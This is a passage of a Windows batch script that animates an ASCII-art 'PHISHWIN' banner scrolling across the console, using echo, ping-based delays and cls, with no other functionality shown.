echo          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo               ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo               "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo               "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo               "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo               "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo               "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                 ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                 "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                 "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                 "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                 "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                 "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                               ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                               "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                               "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                               "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                               "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                               "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                 ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                 "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                 "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                 "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                 "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                 "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                     "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                     "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                     "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                     "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                     "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                      ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                      "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                      "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                      "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                      "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                      "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                       ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                       "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                       "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                       "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                       "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                       "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                        ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                        "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                        "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                        "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                        "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                        "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                         ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                         "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                         "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                         "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                         "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                         "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                          ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                          "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                          "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                          "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                          "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                          "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                           ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                           "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                           "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                           "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                           "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                           "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                            ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                            "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                            "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                            "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                            "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                            "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                             ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                             "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                             "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                             "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                             "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                             "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                              ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                              "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                              "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                              "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                              "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                              "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                               ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                               "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                               "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                               "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                               "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                               "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                 ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                 "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                 "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                 "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                 "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                 "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                  ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                  "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                  "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                  "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                  "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                  "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                   ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                   "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                   "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                   "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                   "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                   "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                    ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
echo                                                    "|   _  \  |  |  |  | |  |     /       ||  |  |  | \   \  /  \  /   / |  | |  \ |  |" 
echo                                                    "|  |_)  | |  |__|  | |  |    |   (----`|  |__|  |  \   \/    \/   /  |  | |   \|  |" 
echo                                                    "|   ___/  |   __   | |  |     \   \    |   __   |   \            /   |  | |  . `  |" 
echo                                                    "|  |      |  |  |  | |  | .----)   |   |  |  |  |    \    /\    /    |  | |  |\   |" 
echo                                                    "| _|      |__|  |__| |__| |_______/    |__|  |__|     \__/  \__/     |__| |__| \__|" 
ping -n 1 -w 1.1.1.1 > nul
ping -n 1 -w 1.1.1.1 > nul
cls
echo                                                     ".______    __    __   __       _______. __    __  ____    __    ____  __  .__   __." 
